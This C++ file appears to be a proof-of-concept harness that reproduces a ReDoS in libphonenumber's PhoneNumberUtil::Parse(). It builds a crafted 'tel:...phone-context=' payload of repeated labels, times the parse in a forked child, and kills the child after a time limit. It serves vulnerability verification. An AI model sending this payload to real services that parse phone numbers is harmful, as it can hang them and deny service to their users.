// End-to-end driver: calls the REAL libphonenumber C++
// PhoneNumberUtil::Parse() on the upstream ReDoS payload. Compiled against
// libphonenumber.a built from the vulnerable release tree (v9.0.43 sources)
// with the default ICU regex backend.
#include <chrono>
#include <csignal>
#include <cstdio>
#include <cstdlib>
#include <string>
#include <sys/wait.h>
#include <unistd.h>

#include "phonenumbers/phonenumberutil.h"

using i18n::phonenumbers::PhoneNumber;
using i18n::phonenumbers::PhoneNumberUtil;

static volatile pid_t g_child = 0;
static void KillChild(int) { if (g_child > 0) kill(g_child, SIGKILL); }

int main(int argc, char** argv) {
  int n = argc > 1 ? atoi(argv[1]) : 30;
  int budget_ms = argc > 2 ? atoi(argv[2]) : 15000;
  std::string evil = "tel:253-0000;phone-context=";
  for (int i = 0; i < n; i++) evil += "aa.";
  evil += "aa!";

  int fds[2];
  if (pipe(fds) != 0) return 2;
  pid_t p = fork();
  if (p == 0) {
    close(fds[0]);
    const PhoneNumberUtil* util = PhoneNumberUtil::GetInstance();
    PhoneNumber num;
    auto t0 = std::chrono::steady_clock::now();
    PhoneNumberUtil::ErrorType e = util->Parse(evil, "US", &num);
    auto t1 = std::chrono::steady_clock::now();
    double ms = std::chrono::duration<double, std::milli>(t1 - t0).count();
    ssize_t ig = write(fds[1], &ms, sizeof(ms));
    (void)ig;
    char msg[96];
    int len = snprintf(msg, sizeof(msg), "err=%d ", (int)e);
    ig = write(fds[1], msg, len);
    (void)ig;
    _exit(0);
  }
  close(fds[1]);
  g_child = p;
  signal(SIGALRM, KillChild);
  alarm((unsigned)((budget_ms + 999) / 1000));
  int st = 0;
  waitpid(p, &st, 0);
  alarm(0);
  g_child = 0;
  if (WIFSIGNALED(st) && WTERMSIG(st) == SIGKILL) {
    std::printf("n=%d PhoneNumberUtil::Parse STILL RUNNING after %d ms (killed)\n",
                n, budget_ms);
  } else {
    double ms = 0;
    char msg[96] = {0};
    ssize_t a = read(fds[0], &ms, sizeof(ms));
    ssize_t b = read(fds[0], msg, sizeof(msg) - 1);
    if (a == (ssize_t)sizeof(ms) && b > 0)
      std::printf("n=%d PhoneNumberUtil::Parse returned in %.1f ms (%s)\n", n, ms, msg);
    else
      std::printf("n=%d parse child died without result\n", n);
  }
  close(fds[0]);
  return 0;
}
